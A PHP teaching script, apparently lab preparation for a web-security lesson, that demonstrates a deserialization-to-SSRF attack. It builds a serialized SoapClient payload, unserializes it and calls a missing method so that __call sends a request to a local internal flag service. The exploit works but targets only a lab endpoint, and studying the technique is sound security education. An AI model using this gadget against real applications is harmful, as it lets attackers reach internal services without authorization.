<?php
// L9 备课实验二：SoapClient __call 引爆全链（打到 8094 内网服务）
echo "=== 直接 GET 内网服务（应被拒）===\n";
$ctx = stream_context_create(array('http' => array('method' => 'GET', 'ignore_errors' => true, 'timeout' => 5)));
echo file_get_contents('http://127.0.0.1:8094/flag_l9.php', false, $ctx), "\n\n";

echo "=== 造弹：SoapClient -> serialize ===\n";
$payload = serialize(new SoapClient(null, array(
    'uri'      => 'http://127.0.0.1:8094/',
    'location' => 'http://127.0.0.1:8094/flag_l9.php',
)));
echo $payload, "\n\n";

echo "=== 发射：unserialize 后调一个不存在的方法（触发 __call -> SSRF）===\n";
$obj = unserialize($payload);
try {
    $result = $obj->health_check();   // SoapClient 没这个方法 -> __call 兜底 -> 发 SOAP 请求
    echo "__call 返回值：\n";
    var_dump($result);
} catch (SoapFault $e) {
    echo "SoapFault 冒出来了：\n";
    echo "  getMessage(): ", $e->getMessage(), "\n";
    echo "  faultcode: ", var_export(@$e->faultcode, true), "\n";
    echo "  faultstring: ", var_export(@$e->faultstring, true), "\n";
}
